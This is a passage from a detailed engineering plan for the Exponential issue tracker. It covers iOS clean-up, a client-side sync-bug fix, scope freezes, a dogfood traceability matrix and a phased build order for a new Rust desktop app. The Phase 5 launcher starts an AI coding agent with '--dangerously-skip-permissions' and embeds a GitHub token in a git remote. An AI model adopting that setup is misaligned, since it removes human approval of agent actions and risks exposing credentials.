- `mintControlTicket(accountId:deviceLabel:)` — currently **uncalled** on iOS (the iOS app registers device presence, but the control-ticket path is not wired to a UI). **Open question:** delete now, or keep if phone→desktop **remote INPUT** (typing into a desktop session *from* the phone, beyond passive viewing) is imminent. Decision for Fable: **delete `mintPublisherTicket` now; keep `mintControlTicket`** — it is cheap, harmless, and the phone-as-remote-input feature is a plausible near-term follow-up (the desktop is already the publisher; wiring phone input is the natural next step). Add a one-line comment `// Retained for a future phone→desktop remote-input surface; not yet wired to UI.` Keep `config`, `mintViewerTicket`, `myDevices`, `startSession`, `connectURL`, and `trpcErrorMessage`.

**Naming/comment sweep.** Rename any `// shared with mac` / `// cross-platform` / `// the iOS and macOS apps` comments across `ExpCore`/`ExpUI` to iOS-only phrasing. Three surviving files also carry **dangling references to the now-deleted Linux/Zig app** that a "self-contained + clean-code" pass must strip:
- `ExpCore/Sources/API/TrpcClient.swift:58` — the comment referencing the "Linux `trpc.query` helper in `apps/linux/src/core/api/trpc.zig`" → drop the `apps/linux`/Zig reference.
- `ExpCore/Tests/AnnotationGeometryTests.swift:6-7` — "or the Linux Zig port … across web, macOS/iOS and Linux" → retarget the parity comment to **"web, iOS"** only.
- `Project.swift` lines 33-35 — the `expCoreTestSources` comment mentioning "and the Linux Zig port" → drop it (this comment is part of §9.3's comment list too, alongside the `ExpCore`/`ExpUI` let-comments).

Do NOT rename the frameworks themselves (`ExpCore`/`ExpUI` stay — they are still meaningfully separate layers, just iOS-only now) and do NOT rename `CrossPlatform.swift` (the name still communicates "UIKit⇄SwiftUI bridging shims," which is accurate; renaming churns imports for no benefit).

### 9.5 EXP-1#13 sync hardening carry-in

EXP-1#13 is the dogfood bug where **all issues suddenly vanished and every project showed empty**. Root cause (already fixed **server-side** on master, see the shape-proxy hardening in §05 and CLAUDE.md → Patterns): a dead bearer token degraded the shape request to the anonymous where-clause → Electric returned a 409 must-refetch → the native `URLCache`, keyed only on URL, served a **poisoned empty snapshot**. The server side (401-on-bad-token, `cache-control: private, no-store`, sorted where clauses) shipped; the matching **client-side** hardening was written on branch `archive/native-desktop-wave1-2` in commit **`f31a631`** (dated today, deliberately **not** an ancestor of `master`) but dropped when the native apps were shelved. This pass **cherry-picks that client hardening into the live iOS `ExpCore/Sources/Electric/`.** The identical fix is what §05's Rust sync engine must ship — **both clients land the same EXP-1#13 fix.**

Recover the diff with `git show f31a631 -- apps/ios/ExpCore/Sources/Electric/` (or `git cherry-pick -n f31a631` then discard non-Electric hunks). The four pieces:

1. **`ShapeClient.swift` URLCache guard.** On the `URLSession` config used for shape requests, set `config.requestCachePolicy = .reloadIgnoringLocalAndRemoteCacheData` **and** `config.urlCache = nil`. Electric's upstream `public, max-age=604800` must never let a shared HTTP cache serve a stale/cross-auth shape body. (The proxy already sends `private, no-store`, but nil-ing the client cache is belt-and-suspenders and matches the §05 Rust decision that the sync client owns its cursor persistence, never an HTTP cache.)

2. **Persisted 409-refetch marker + replacement handle.** Add `needs_refetch` / `is_live` state so that on a 409 must-refetch the client re-fetches that shape **from `offset=-1`** and **re-adopts the new shape handle** without ever serving a stale cached body — the atomic refetch. Persist this via a **NEW ADDITIVE GRDB migration**:

   ```swift
   // ExpCore/Sources/DB/Migrations.swift — register AFTER the existing v1 registration.
   migrator.registerMigration("v2_offset_refetch_flags") { db in
       try db.alter(table: "shape_cursor") { t in
           t.add(column: "needs_refetch", .boolean).notNull().defaults(to: false)
           t.add(column: "is_live", .boolean).notNull().defaults(to: false)
       }
   }
   ```

   **Do NOT bump the `-v4.sqlite` database filename.** A filename bump wipes every local DB and forces a full 14-shape resync for every existing install; an `ALTER TABLE` migration is additive and preserves the local snapshot + cursors. (Match the exact table/column names to what `f31a631` used — read the commit; the snippet above is illustrative of the shape, verify against source.)

3. **Snapshot-end recognition + non-live catch-up pacing.** Carry the logic that distinguishes the **initial snapshot** (offset-driven catch-up, paced) from the **live tail** (long-poll). Before the snapshot `up-to-date` control message, the client should catch up without hammering; after it, it flips `is_live` and holds the ~90s long-poll. This is the same behavior §05's Rust `manager.rs`/`client.rs` must implement (one blocking long-poll per shape).

4. **`SyncManager.resync()` + debug button.** A `resync()` that purges the `URLCache` and **serializes per-account** (so two accounts don't clobber each other's cursors), wired to a button in `SyncDebugView`. This is the manual escape hatch if a client ever wedges.

**Migration safety:** the `v2_offset_refetch_flags` migration must be strictly additive (`ADD COLUMN ... NOT NULL DEFAULT false`) so existing rows survive; register it *after* the existing v1 migration in the `DatabaseMigrator` so a fresh install runs v1→v2 and an upgrading install runs only v2. Never re-order or edit v1.

### 9.6 Sequence (do it in this order)

1. **Delete + retarget + regen (mechanical, atomic).** `git rm` the `ExponentialMac/` tree + `ExponentialMac.entitlements` + `scripts/setup-ghostty-macos.sh` (+ remove `scripts/`); `rm -rf` the local `vendor/`/`build/`/`Derived/`/`.xcodeproj`/`.xcworkspace`; edit `.gitignore`; rewrite `Project.swift` to 7 targets / 4 schemes. **Then** `tuist generate` from `apps/ios`. Doing deletion+regen **before** any source stripping means an accidental cross-use of a mac symbol shows up as a **compile error in the regenerated iOS project**, not a silent runtime change.
2. **Apply the shim/KeychainStore simplifications** (§9.4). Rebuild.
3. **Apply the sync carry-in** (§9.5) — the additive migration + `ShapeClient`/`SyncManager` changes.
4. **Build the `Exponential` scheme** iOS-only and **run `ExpCoreTests`** as the gate.

### 9.7 MUST-NOT-BREAK checklist

- **iOS feature parity:** My Issues, Inbox, the steer **VIEWER** (`SteerViewerModel`/`SteerTerminalView`/`SteerSessionSection` over `VTScreen`), duplicate UX, the block-based **GFM byte-parity** editor (`IssueEditorModel` + `MarkdownConversion`), and push/Firebase all keep working.
- **The 14-shape sync contract** is unchanged (workspaces, projects, issues, labels, issue_labels, users, workspace_members, workspace_invites, comments, attachments, notifications, issue_events, issue_subscribers, coding_sessions).
- **ShareExtension app-group token read** — preserve `kSecAttrAccessGroup` in `KeychainStore`; Share-to-Exponential must still read the app session token.
- **`ExpCoreTests` green** — AnnotationGeometry TS-parity + `VTScreenTests`.
- **Remote-start-from-phone** — `SteerApi.startSession` stays; a phone can still remote-start a coding session on the desktop.

### 9.8 Phase-7 gate (exit criteria)

1. `tuist generate` from `apps/ios` produces a project with **no mac target** — exactly 7 targets / 4 schemes.
2. The `Exponential` scheme **builds iOS-only** (`xcodebuild -workspace apps/ios/Exponential.xcworkspace -scheme Exponential -destination 'generic/platform=iOS Simulator' CODE_SIGNING_ALLOWED=NO build`).
3. `ExpCoreTests` **green** (AnnotationGeometry parity + VTScreen).
4. **Share-to-Exponential** still reads the app-group Keychain token (manual: share an image from Photos into the extension while signed in).
5. The **14 shapes sync** on iOS and a **forced 409** does an **atomic refetch** — no empty-table flicker, no "all issues vanished" regression (the EXP-1#13 fix is live on iOS).

No dependency on §03–§08; this track can be executed and merged on its own timeline.


---

## 10. Explicit UNCHANGED set + EXP-1..EXP-5 traceability

This section exists to keep Fable honest about scope. The v3 pivot is a **desktop-only replacement plus an iOS self-containment pass** — it is emphatically *not* a rewrite of the tracker, the server, the relays, or the mobile clients. Two things follow. First, a hard, enumerated list of everything this plan **must not touch** (§10.1) — if a change to one of these surfaces seems necessary to make the desktop app work, that is a signal you have mis-scoped and should re-read §02/§05/§07, not edit web/server code. Second, a full **traceability matrix** (§10.2) mapping every EXP-1..EXP-5 dogfood sub-item to the exact section that discharges it, with an explicit split between the items already **landed on web/server** (no action) and the items that are **actionable on the new desktop app or on iOS** (routed to their owning phase/section). §10.3 states the "two dogfood classes" rule so nobody re-does finished work.

### 10.1 The UNCHANGED set (do not modify)

The following are **frozen for the duration of the v3 work**. They are load-bearing for all four surviving surfaces; the desktop app is a *new consumer* of their existing contracts, never a reason to change them. Where the desktop needs something these surfaces expose, it goes through the **existing** interface (tRPC procedures, the 14 shape proxies, the steer relay wire protocol, the MCP endpoint) exactly as web/iOS/Android do today.

**Web app & server — `apps/web` (entirely unchanged except the one additive schema item noted below).**
- All **14 Electric shape proxies** in `apps/web/src/routes/api/shapes/` and their shared builder `apps/web/src/lib/shape-route.ts`. The proxy count stays **14**, the shape count stays **14**, and the three hardening properties are already correct (private/no-store cache headers; token-fail → 401; sorted `buildWhereClause` id lists). The Rust sync engine (§05) is written to satisfy these contracts as they already exist — it does **not** get to request a new column, a new proxy, or a relaxed cache header. The `issue-subscribers` proxy keeps its server-side `columns` allowlist that **excludes** the reporter `email` (widget-reporter PII stays server-only).
- **All tRPC routers** in `apps/web/src/lib/trpc/`: `issues`, `projects`, `workspaces`, `labels`, `issue-labels`, `comments`, `notifications`, `subscriptions`, `workspace-members`, `workspace-invites`, `users`, `push-tokens`, `integrations`, `billing`, `admin`, `onboarding`, `repositories`, `coding-sessions`, `widgets`, `steer`. The desktop's `api` crate (§07) is a **new HTTP client** of these procedures; it adds no server procedure **except** the new `runConfigs` router that ships alongside the new `run_configs` table (§02, §07 DC-4) — that is the single server-side addition in this whole plan, and it is purely additive (new file, new table, no edits to existing routers).
- The `generateTxId` / `awaitTxId` Electric-sync gate, the Better Auth server config (`apps/web/src/lib/auth/`), the `/api/mcp` MCP endpoint and its tools (`open_pr`, etc.), the GitHub-App installation-token minting path, the S3 attachment routes, `/api/health`. The desktop consumes `/api/mcp` (via the `.mcp.json` it writes, §07) and mints its personal `expu_` key through the **existing** Better Auth apikey mechanism — no new auth surface.

**Push relay — `apps/push-relay` (unchanged).** No desktop dependency. FCM/APNs delivery, `/healthz`, and the `PUSH_RELAY_SECRET` contract are untouched.

**Steer relay — `apps/steer-relay` (unchanged; wire protocol + ticket format FROZEN).** This is the most important freeze for §08. The desktop app becomes the relay's **publisher** (today there is no desktop publisher; the deleted native apps were), but it does so by speaking the **already-shipped** wire protocol byte-for-byte: the device control channel (presence, `start_session`), the per-session room framing (the `0x01` output frame prefix, input injection, resize, claim/take-over, kill, ring replay), and the **server-minted HS256 steer ticket** verified by `packages/steer-ticket`. The desktop **never signs tickets** — it requests them from the web server's `steer` tRPC router and presents them to the relay, exactly as the spec's §3 already defines. If the desktop needs a protocol capability the relay doesn't have, that is an **open question for a future plan**, not an edit here.

**Marketing — `apps/marketing` (unchanged).** No relationship to the desktop app.

**Android — `apps/android` (entirely unchanged).** Android is **not** part of the v3 cut. It keeps its from-scratch block markdown editor (`ui/markdown/`), its GRDB-less sync, its glass design system, and full 14-shape parity. Do not "modernize" it to match the desktop; the two share only the `domain-contract` and `design-tokens` generated constants, and those keep their existing Kotlin emitters.

**The data model (unchanged except `run_configs`).** The **14 synced shapes** (workspaces, projects, issues, labels, issue_labels, users, workspace_members, workspace_invites, comments, attachments, notifications, issue_events, issue_subscribers, coding_sessions) and the **server-only tables** (repositories, project_repositories, github_installations, user_notification_prefs, email_deliveries, widget_configs, widget_submissions, fcm_tokens, push_subscriptions + Better Auth tables) keep their columns, triggers, and Electric-vs-server-only classification. The **only** schema change in the entire v3 plan is the additive **`run_configs`** table (server-only, tRPC-read, never synced — see §02 and §07 DC-4). No existing column is added, renamed, retyped, or moved between synced/server-only. The custom triggers (`generate_issue_number`, `update_updated_at`, the `populate_*_workspace_id` denormalizers) are untouched.

**Notifications / email / one-way helpdesk (masterplan v2 §6, unchanged).** `notification_type` values, the `issue_mention` auto-subscribe path (`apps/web/src/lib/integrations/mentions.ts`), the Resend/SMTP outbound sender, signed unsubscribe tokens, and `user_notification_prefs` are all inherited as-is. The desktop renders the `notifications` shape in an Inbox view (§04) and reads prefs via existing tRPC — it originates no new notification type.

**Billing (Creem, web-only, masterplan v2 §8) + the admin console (unchanged, and web-only).** Billing and the admin console are **deliberately web-only** and stay that way. The desktop app, like iOS and Android, shows **no billing UI and no admin UI** (store-policy-safe framing carries over even though desktop isn't store-distributed — the simplicity is the point). Plan limits are enforced server-side; the desktop just gets the same `FORBIDDEN`/limit errors from tRPC that web would and surfaces them inline. Do not port `components/workspace/billing/` or `routes/_authenticated/admin/*` to Rust.

**Mobile parity (iOS keeps full parity; only the *mac target* leaves).** iOS remains a **full-parity** client of all 14 shapes with the complete tracker feature set. What §09 removes is exclusively the **macOS target `apps/ios/ExponentialMac`** and the ghostty vendoring, plus the `#if os(macOS)` scaffolding — after which `ExpCore`/`ExpUI` become **iOS-only** frameworks. The iOS *product* loses nothing; it becomes self-contained again. Do not conflate "delete the mac target" with "reduce iOS."

**`contract.json` enum VALUES (unchanged; only a codegen *target* is added).** Every enum in `packages/domain-contract/contract.json` keeps its exact value set — `issue_status`, `issue_priority`, `notification_type`, `workspace_member_role`, `public_write_policy`, `recurrence_unit`, `pr_state`, `coding_session_status`, `issue_event_type`, `subscriber_source`, and the `recurrenceIntervals`/`moderationRestrictedFields` arrays. The v3 change to this package is **only** that the **Zig emitter is removed and a Rust emitter is added** (§02), producing `apps/desktop/crates/domain/src/contract.generated.rs`. No value changes, so `bun run --filter @exp/domain-contract generate` must still produce zero diff on the Swift/Kotlin outputs.

The one genuinely open decision here is the **`platform` enum**. It is today exactly:

```json
"platform": { "values": ["web", "android", "ios", "command"] }
```

Note it already does **not** distinguish desktop OSes — there is no `macos` or `linux` value — and the two deleted native desktop apps never added one; they reported an existing value (or `command`) where a platform tag was required. The v3 plan **preserves this** as-is: the desktop app is expected to report an existing value rather than force a schema migration.

> **Open question:** should the new gpui desktop app report a *new* `platform` value (e.g. `"desktop"`) so that server-side analytics/notifications can tell "coding from the desktop IDE" apart from web/mobile/command origins? If yes, this is a **single** `contract.json` edit (append `"desktop"` to the `platform` values array) plus `bun run --filter @exp/domain-contract generate` (regenerating Swift/Kotlin/**Rust**) plus a `migrate:generate`/`migrate` if any column is a DB enum rather than free text. It is the *only* contract change the desktop could plausibly justify, and it is **out of scope by default** — do it only if a concrete server consumer needs the distinction. Until decided, the desktop reports an existing value.

### 10.2 EXP-1..EXP-5 traceability matrix

The dogfood issues EXP-1..EXP-5 are the acceptance backbone of this plan. Every sub-item below is tagged with its **disposition** — `LANDED (web/server)` means it is already done and this plan does nothing, `ACTIONABLE (desktop)` / `ACTIONABLE (iOS)` means the new work routes to the cited section and its phase gate. Fable should treat the "ACTIONABLE" rows as a checklist that the corresponding phase gate must visibly satisfy.

#### EXP-1 — macOS pixel-parity (13 sub-points)

The native mac UI was not pixel-parity with web. Every one of these transfers to the **new gpui desktop app**; the fix is "build it the way web does it via gpui-component," owned by **§04 (UI parity + theming)** except the two noted below. All are exercised by the **Phase 3** gate ("side-by-side pixel-diff of board/detail/sidebar vs web at compact density passes; the EXP-1 chrome punch-list is visibly satisfied").

| # | EXP-1 sub-item | Disposition | Where addressed |
|---|---|---|---|
| 1 | Native workspace-picker dropdown is ugly | ACTIONABLE (desktop) | **§04** — shadcn-style picker via gpui-component `Popover`/`Menu`, not a native menu |
| 2 | "+" for new project sits by the workspace picker, not on the sidebar Projects header | ACTIONABLE (desktop) | **§04** — "+" affordance on the sidebar **Projects** section header |
| 3 | Sidebar missing My Issues + Inbox + Search | ACTIONABLE (desktop) | **§04** — sidebar top nav gains My Issues, Inbox, Search entries |
| 4 | Project-view top filter tabs (All/active/backlog) not web-styled + wrong list background color | ACTIONABLE (desktop) | **§04** — `filter_bar`/tabs styled to web; list uses the correct theme surface token (§03 tokens) |
| 5 | All dropdowns are native (missing icons) — e.g. issue-create dialog | ACTIONABLE (desktop) | **§04** — every dropdown is a gpui-component `Select`/`Menu`/`Combobox` **with Lucide icons**, never a native menu |
| 6 | Issue-create dialog layout unlike web | ACTIONABLE (desktop) | **§04** — `create_issue_dialog` mirrors web layout field-for-field |
| 7 | Cannot paste images from clipboard into new-issue description | ACTIONABLE (desktop) | **§04** — clipboard **`ClipboardEntry::Image`** path in the markdown editor → upload → `![](/api/attachments/{id})` |
| 8 | Sidebar should NOT be collapsible | ACTIONABLE (desktop) | **§04** — gpui-component `Sidebar` configured **`SidebarCollapsible::None`** (also asserted by the §03 shell) |
| 9 | Integrations menu still shows old Google Calendar | ACTIONABLE (desktop) | **§07** — integrations surface shows only the real integrations (GitHub); **no Google Calendar**. (iOS carries **none** — §09 has no integrations menu regression to fix) |
| 10 | Send-feedback should be in the sidebar directly, not buried in a menu | ACTIONABLE (desktop) | **§04** — a direct **Feedback** entry in the sidebar (mirrors web's `FeedbackButton`) |
| 11 | Settings should be reachable from the bottom dropdown, not only the system top menu | ACTIONABLE (desktop) | **§04** — Settings in the sidebar-bottom account dropdown (the macOS menubar item in §03 is *additional*, not the only path) |
| 12 | Top filter button should match web exactly | ACTIONABLE (desktop) | **§04** — filter button/popover is a pixel match of web's `IssueFilterBar`/`IssueFilterPopover` |
| 13 | "All issues suddenly vanished + projects show empty" — a **SYNC BUG** | ACTIONABLE (desktop **§05** + iOS **§09**) | Root cause already **server-fixed** (dead bearer → anon shape degradation → Electric 409 must-refetch → URLCache-poisoned empty snapshot). The client-side fix was dropped with the native apps, so the **new Rust sync engine must handle 409/cache-control/401 correctly from day one — §05**; the same hardening is **carried into iOS's ShapeClient/SyncManager — §09** |

EXP-1#13 is the single most important non-cosmetic carry-over. §05 owns it for desktop (no URL-cache of shape bodies; 409 → atomic refetch from `offset=-1` re-adopting the new shape handle with no empty-table flicker; dead token → login, never a silent anonymous empty board; sorted where-clause id lists). §09 owns the identical fix on iOS via an additive GRDB migration. Its Phase-2 gate ("a forced 409 does an atomic refetch with no empty-table flicker; a dead token routes to login") and Phase-7 gate ("a forced 409 does an atomic refetch on iOS") are the acceptance tests.

#### EXP-2 — desktop agents / onboarding / preview

| Sub-item | Disposition | Where addressed |
|---|---|---|
| (a) The personal API key for local coding should be **hidden + auto-generated**, never entered manually | ACTIONABLE (desktop) | **§07 (DC-2)** — the `expu_` Better Auth apikey is **auto-minted on first coding session** and stored in the file-based token store (0600); UI shows only a **Regenerate**, never a paste field |
| (b) Desktop onboarding should **verify tooling is installed** (`claude` CLI binary, `git`) with auto-checks + clear errors | ACTIONABLE (desktop) | **§07 (DC-3)** — the **tooling doctor** probes `claude` and `git` on PATH, reports version/missing, and **blocks Start coding** with an actionable error when `claude` is absent |
| (c) **DITCH** the "preview" feature | ACTIONABLE (desktop) | **§01 / §07** — preview is **deleted, not ported**. The new desktop has no preview surface at all; do not build one |
| (d) Run configs should **not** live in the repo — store them in the **DATABASE**, essentially a terminal command to launch | ACTIONABLE (desktop + server) | **§07 (DC-4)** — new **`run_configs`** table (server-only, §02) + **`runConfigs`** tRPC router; a run config is a stored terminal command; **§02** covers the table + the generated-code/router path |
| (e) Terminal should have **multiple tabs** (one for claude, one per run) AND allow plain terminal sessions like any IDE; orient on JetBrains — run-config dropdown + **play** button top-right; clicking play opens a bottom terminal and play becomes **stop** | ACTIONABLE (desktop) | **§06 (multi-tab TerminalManager)** + **§07 (run_bar: run-config dropdown, play/stop, tab-per-run)** |
| (f) Make the whole desktop UI more **COMPACT/smaller** | ACTIONABLE (desktop) | **§03 (theme density)** + **§04 (compact spacing/typography)** — the Exponential Dark theme ships at a tighter density than web |
| (g) Web onboarding should be better (project + connect GitHub matter more than "create your first issue") | **LANDED (web)** | Already shipped on web (per handoff); **unchanged** by this plan. The desktop onboarding (b/§07) is the actionable desktop analog |

#### EXP-3 — webui changes

All three are **LANDED on web** and require **no work** here. The obligation on the desktop is that its **from-scratch markdown editor and dialogs inherit the same decisions** (owned by **§04**), so the desktop never reintroduces the fixed-on-web papercuts.

| Sub-item | Disposition | Where addressed |
|---|---|---|
| Create-issue dialog scroll | LANDED (web) | Desktop `create_issue_dialog` inherits the scroll behavior — **§04** |
| Ditch the selection popover in the markdown editor | LANDED (web) | Desktop editor has **no selection popover** — **§04** |
| Square date-picker button | LANDED (web) | Desktop date-picker button is square — **§04** |

#### EXP-4 — dogfooding issues

Web/server parts are **LANDED**; the actionable residue is that the **desktop must show the correct GitHub-connected state and must not falsely block Start coding**.

| Sub-item | Disposition | Where addressed |
|---|---|---|
| Single **Exponential** project in the public feedback workspace + repo connected | LANDED (web/server) | Cloud bootstrap already does this — **unchanged** |
| GitHub App reported "not installed" | LANDED (server) | GitHub-App installation sync + self-heal already fixed server-side — **unchanged** |
| Integration settings should live **inside workspace settings** | LANDED (web) | Already moved on web — **unchanged**; desktop mirrors that placement in its settings screens (**§04/§07**) |
| Desktop said "github not connected", **blocking Start coding** | ACTIONABLE (desktop) | **§07 (DC-1 gate + DC-3)** — the launcher reads real GitHub-connected/installation state via the existing `repositories`/`integrations` tRPC and **only** blocks when genuinely unconnected; the doctor distinguishes "repo not connected" from "claude missing" so the error is truthful |

#### EXP-5 — linux login

| Sub-item | Disposition | Where addressed |
|---|---|---|
| Login view not like mac (missing the **cloud button first**) | ACTIONABLE (desktop) | **§04** — login-view parity: the **cloud sign-in button is presented first**, same ordering/styling as the reference |
| "Login with Google" **opens a text editor** on fresh Ubuntu (misconfigured `xdg-open`) — blocks everything | ACTIONABLE (desktop) | **§05 (auth)** — a **robust browser-open opener chain** (try `$BROWSER`, then `xdg-open`, then `gio open`, then known-browser binaries; never fall through to a text editor) drives the OAuth flow; **§04** owns the login-view ordering |

The opener chain lives in the `api` crate (`opener.rs`, §05/§07) and is the same code the desktop uses for any "open in browser" action (OAuth start, external links). Both halves of EXP-5 are now explicitly gated: the **Phase-3 gate** names the login/auth screen in its pixel-diff and requires the **cloud/sign-in button first**; the **Phase-8 gate** requires that, on a **fresh Ubuntu** box with no/broken default-browser association, "Sign in with Google" reaches a real browser via the opener chain (never a text editor) and the OAuth callback returns to the app — validated on real Linux hardware, not a VM.

### 10.3 The two dogfood classes (so nobody re-does finished work)

Every EXP sub-item falls into exactly one of two classes:

1. **Web/server class — DONE, no action.** These were fixed on `apps/web` and the server before v3 began: EXP-2g (web onboarding), all of EXP-3 (dialog scroll, selection-popover removal, square date button), EXP-4's project/repo/GitHub-App/integration-placement items. This plan **must not** re-touch them; they are listed here only so the desktop and iOS surfaces **inherit** the same decisions rather than regress them.

2. **Desktop + iOS class — the actionable set.** Everything the deleted native apps were supposed to do and the new surfaces must now deliver: all 13 of EXP-1 (→ §04, with #13's sync fix → §05 and, on iOS, → §09), EXP-2 a/b/c/d/e/f (→ §07 and §06/§03/§04), EXP-4's "desktop shows correct GitHub state / doesn't falsely block" (→ §07), and both EXP-5 items (→ §05 + §04). These rows are the acceptance checklist for Phases 3–6 (desktop) and Phase 7 (iOS).

The governing rule: **if an EXP item is marked LANDED above, treat the web/server as ground truth and copy its behavior into the new surface — do not reopen the original fix.** If it is marked ACTIONABLE, it is not done until the cited section's phase gate demonstrates it.


---

## 11. Sequenced execution plan for Fable

This section is the build order of record. It sequences the whole v3 pivot into nine gated phases, states why each phase must precede the next, calls out the three de-risking spikes to run before committing to any of it, and fixes the v1 Definition of Done. Every phase ends at a concrete GREEN gate — Fable does not advance to phase N+1 until phase N's gate is demonstrably met (not "looks done", *demonstrated* against the checklist). The owning sections (§02–§10) hold the implementation detail; this section owns the order, the dependencies, and the gates.

The golden rule of the ordering: **clear the deck, land the codegen, then build the foundation the whole app reads from, then build outward.** Nothing in the UI can render until sync exists; nothing in IDE-land can run until the terminal exists; the steer publisher tees the terminal so it follows both. iOS is orthogonal and runs alongside on its own clock.

### 11.1 Dependency graph at a glance

```
Phase 0 ── repo cut + Rust codegen + CI scaffold  (clears deck, lands generated files)
   │
Phase 1 ── desktop skeleton + Exponential Dark theme + app shell  (needs codegen: theme/domain consts)
   │
Phase 2 ── Rust Electric sync engine (14 shapes + auth + EXP-1#13)  (the load-bearing foundation)
   │
Phase 3 ── UI parity screens + markdown editor + @mention/#ref autocomplete  (reads §2 collections)
   │
Phase 4 ── embedded terminal (alacritty tee + tabs)  (independent of screens; needed before IDE)
   │
Phase 5 ── IDE features (Start-coding launcher + hidden key + DB run configs + diff + doctor)
   │
Phase 6 ── steer publisher (control channel + session publisher)  (tees the Phase-4 terminal)
   │
Phase 8 ── green + release  (docs to four-surface reality; killer flow on real hardware; CI artifacts)

Phase 7 ── iOS self-containment + clean-code + EXP-1#13 carry-in  ── PARALLEL, no dep on 1–6
```

The trunk is strictly linear (0→1→2→3→4→5→6→8) because each phase consumes a real artifact of the one before it. **Phase 7 (iOS)** hangs off Phase 0 only — once the repo cut has deleted the mac target and rewritten `Project.swift`, iOS work proceeds on its own track and merges whenever it is green. It touches no Rust and no desktop crate; a second person (or a parallel Fable session) can own it start-to-finish. Phase 7 is numbered out of trunk order deliberately: it is the odd one out, not step "seven of the desktop build."

### 11.2 Why this order (rationale, phase by phase)

**Phase 0 first — because the cut clears the deck and lands the codegen the desktop compiles against.** You cannot bootstrap `apps/desktop` against `crates/domain/src/contract.generated.rs` and `crates/theme/src/tokens.generated.rs` if the emitters that produce them don't exist yet, and you should not carry `apps/linux` (53 tracked Zig files) or the Zig codegen emitter through the rest of the work as dead weight and merge-conflict surface. Phase 0 is a pure subtraction-plus-scaffold: delete the two native desktop codebases and their VM docs, remove the Zig emitter, add the Rust emitters (committing their output), stand up an empty-but-green `apps/desktop` Cargo workspace, and add `build-desktop.yml` with a generator-drift guard so nobody can ever hand-edit a generated file and get away with it. See §02 for the exact delete/add/update lists.

**Phase 1 second — because you need a window on screen and a theme applied before any screen has somewhere to live.** This is the smallest possible gpui-component app that proves the four pillars boot together: gpui pinned to gpui-component's exact rev (LD-7 — the whole workspace inherits `1d217ee39d381ac101b7cf49d3d22451ac1093fe`), `gpui_component::init`, the Exponential Dark theme built programmatically from the generated `Srgb8` tokens (forced dark, compact density, never syncing system appearance), and the `Root → Workspace → DockArea` shell with a non-collapsible `Sidebar` (EXP-1#8) plus empty center `TabPanel`s and an empty bottom terminal dock. Multi-window is wired here (two `cx.open_window` calls sharing the global `Store`) because retrofitting multi-window after state has metastasized is far more expensive than proving it empty. See §03 (architecture/shell) and §04 (theming).

**Phase 2 third — because sync is the load-bearing foundation every screen reads from, so it must exist before any screen.** There is nothing to render until the 14 Electric shapes are flowing into gpui `Entity`-backed collections. This phase is deliberately UI-light: the `sync` crate (`protocol.rs`/`client.rs`/`store.rs`/`manager.rs`) is written gpui-free and fixture-tested against `packages/electric-protocol` *before* the `collections.rs` gpui glue, and the `api` crate lands auth (login, the file-based token store, opener chain, the tRPC-over-HTTP client, the auto-minted `expu_` key). Every EXP-1#13 sync gotcha is baked in here at day one — the 409/must-refetch atomic re-adopt, the no-URL-cache discipline, the 401→reauth routing, the sorted-where-clause shape identity — because these are the exact bugs that made the old native apps show empty boards, and the new engine has no excuse to reintroduce them. See §05.

**Phase 3 fourth — because now the collections exist to read and the tRPC client exists to mutate.** Every web screen gets mirrored via gpui-component (sidebar, board, detail, dialogs, inbox, my-issues, settings, account), reading the §2 collections and writing through tRPC with the `awaitTxId` gate. `filters.ts` and `domain.ts` are ported verbatim (the domain enums/icons/colors already live in `crates/domain`). The from-scratch GFM markdown editor is built here and carries its **own sub-gate** (byte-parity fixtures must round-trip before the phase can close) — it is the single highest-risk parity surface and is not allowed to be "mostly working." The @email/#IDENT caret-anchored autocomplete, issue-ref pills, and clipboard image paste (EXP-1#7) ride with it. All EXP-1 chrome fixes land here. See §04 (parity/chrome) and its markdown-editor subsection.

**Phase 4 fifth — because the terminal is independent of the screens but must exist before any IDE feature can launch into it.** The terminal is reimplemented cleanly over **upstream** `alacritty_terminal 0.26` + `portable-pty 0.9` + `vte 0.15` (Apache-2.0 — *not* Zed's GPL fork; Zed's `crates/terminal` and `crates/terminal_view` are GPL-3.0-or-later and are study-only, reimplement-clean — the licensing boundary is absolute). We own the PTY master, so the single read-loop can software-tee its bytes to both the emulator and (later) the steer publisher. This phase also lands the gpui grid `Element` (layout/paint/cursor/selection/resize/SIGWINCH), the reimplemented `to_esc_str` key table, and the JetBrains-style multi-tab `TerminalManager` in the bottom dock (EXP-2e). It has no dependency on the screens — it could be built in parallel with Phase 3 in principle — but is sequenced after 3 so there is always one coherent, demoable trunk. See §06.

**Phase 5 sixth — because the IDE features spawn `claude` and run-commands *into* the terminal built in Phase 4.** The `coding` crate wires the full Start-coding launcher (repo resolve → JIT GitHub-App token → worktree + `exp/<ID>` branch + token-embedded remote → `.mcp.json` + `PROMPT.md` → `codingSessions.start` → spawn `claude --dangerously-skip-permissions`). The hidden auto-minted `expu_` key (EXP-2a) lands here in the file-based token store. The new `run_configs` table + `runConfigs` tRPC router + Trust-and-Run gate + play/stop tabs (EXP-2d/e) land here. The side-by-side syntax-highlighted read-only PR diff and the settings + tooling-doctor onboarding (EXP-2b, EXP-4) round it out. All of this requires a working multi-tab terminal to spawn into, hence its position after Phase 4. See §07.

**Phase 6 seventh — because the steer publisher tees the very terminal PTY built in Phase 4 and driven by Phase 5.** The `steer` crate becomes the relay **publisher** over the frozen wire protocol: the per-app control channel (device presence + inbound `start_session` routed into the Phase-5 launcher), and the per-session publisher that tees `0x01` output frames out, injects remote input back into the PTY, forwards resize, handles claim/kill, replays the ring buffer, and auto-reconnects. It must follow the terminal (the thing it tees) and the launcher (the thing that opens sessions to tee). The wire protocol and ticket format are **frozen** — the desktop is a new *publisher* against an unchanged `apps/steer-relay`; the desktop never signs tickets, it consumes server-minted ones. See §08.

**Phase 8 last — green + release.** Docs get rewritten to the four-surface reality (vision.md platform table, CLAUDE.md, masterplan cross-refs — no lingering five-client/native-mac/Zig framing), the full killer flow is confirmed on real hardware (macOS + a real-GPU Linux box), and unsigned CI artifacts build on a `desktop-v*` tag. Signing/notarization/AppImage packaging are explicitly release-time manual TODOs, not gate blockers. See §02 (CI) and §10 (traceability).

**Phase 7 alongside — iOS is orthogonal.** It shares no code path with the desktop trunk. It only needs Phase 0 to have deleted the mac target and rewritten `Project.swift` so `ExpCore`/`ExpUI` become iOS-only frameworks. From there it is a self-contained clean-code pass plus the EXP-1#13 sync hardening carried into the Swift `ShapeClient`/`SyncManager` via an additive GRDB migration. See §09.

### 11.3 De-risking spikes (run these BEFORE committing to the trunk)

